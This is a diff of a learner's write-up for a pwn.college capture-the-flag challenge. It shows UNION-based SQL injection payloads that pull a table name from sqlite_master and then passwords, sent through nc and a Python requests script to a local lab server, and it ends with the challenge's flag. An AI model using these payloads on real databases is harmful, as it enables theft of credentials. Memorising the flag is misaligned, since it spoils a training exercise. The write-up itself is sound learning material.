@@ -18,14 +18,14 @@ here i made 2 different requests:
   - first one to retrieve table's full name using sqlite_master: 
         users_" UNION SELECT tbl_name FROM sqlite_master"  
   - second one to actually retrieve the flag:
-        pwn.college{" UNION SELECT password FROM users_[copied the value printed before]"
+        " UNION SELECT password FROM users_[copied the value printed before]"
 -ran: '/challenge/server'
 -ran: 'nc -v challenge.localhost 80'
--typed: 'GET /?query=users_%22%20UNION%20SELECT%20tbl_name%20FROM%20sqlite_master%22 HTTP/1.1'
+-typed: 'GET /?query=%22%20UNION%20SELECT%20tbl_name%20FROM%20sqlite_master%22 HTTP/1.1'
         'Host: challenge.localhost'
 -output: copied the table's name: users_*
 -ran: 'nc -v challenge.localhost 80'
--typed: 'GET /?query=pwn.college%7B%22%20UNION%20SELECT%20password%20FROM%20users_[pasted the value]%22 HTTP/1.1'
+-typed: 'GET /?query=%22%20UNION%20SELECT%20password%20FROM%20users_[pasted the value]%22 HTTP/1.1'
         'Host: challenge.localhost'
 -flag popped out
 
@@ -42,7 +42,7 @@ II WAY -> python
         'p = process("/challenge/server")'
         'time.sleep(1)'
         'params1 = {'
-                '"query" : "users_\" UNION SELECT tbl_name FROM sqlite_master\""'
+                '"query" : "" UNION SELECT tbl_name FROM sqlite_master\""'
                 '}'
         'r = requests.get(url, params=params1)'
         'soup = BeautifulSoup(r.text, 'html.parser')'
@@ -58,10 +58,13 @@ II WAY -> python
 -flag popped out
 
 ## 🧑🏾‍🏫 what this challenge teaches u
-obviusly (but non for me in that moment), u can perform multiple query at the database and retrieve informations piecemeal
+obviously (but non for me in that moment), u can perform multiple query at the database and retrieve informations piecemeal
 sqlite_master is the first table which stores every other tables info such as type, name, tbl_name ...
 i found this usefull: https://www.sqlite.org/schematab.html
-python_>
+BeautifulSoup is a library which allows u to parse webpages 
+in this case i created soup which contains the webpage
+then i selected only strings surrounded by <pre> and picked the last one (table's name)
+get_text() is a BeautifulSoup method that extracts only readable text
 
 ## 🏁 Flag  
 pwn.college{EYZ7WuEyxjCKU4JfacctCnbsfm4.QXykzMzwCO4IDOxEzW}
